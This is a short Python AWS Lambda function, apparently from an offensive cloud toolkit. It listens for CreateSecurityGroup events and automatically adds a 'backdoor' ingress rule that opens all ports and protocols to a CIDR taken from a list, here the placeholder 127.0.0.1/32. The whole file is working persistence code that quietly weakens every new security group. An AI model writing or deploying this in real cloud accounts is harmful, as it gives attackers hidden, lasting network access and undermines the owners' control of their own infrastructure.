#!/usr/bin/env python
from __future__ import print_function
import json
import boto3
import random

# A list of rules to add at random to security groups.
BACKDOOR_RULES = [
    { 'FromPort': 0, 'ToPort': 65535, 'CidrIp': '127.0.0.1/32', 'IpProtocol': '-1'}
]


def lambda_handler(event, context):
    if event['detail']['eventName'] == 'CreateSecurityGroup':
        security_group_name = event['detail']['requestParameters']['groupName']
        client = boto3.client('ec2')
        backdoor_rule = random.choice(BACKDOOR_RULES)
        response = client.authorize_security_group_ingress(
            GroupName=security_group_name,
            CidrIp=backdoor_rule['CidrIp'],
            FromPort=backdoor_rule['FromPort'],
            ToPort=backdoor_rule['ToPort'],
            IpProtocol=backdoor_rule['IpProtocol']
        )
    return None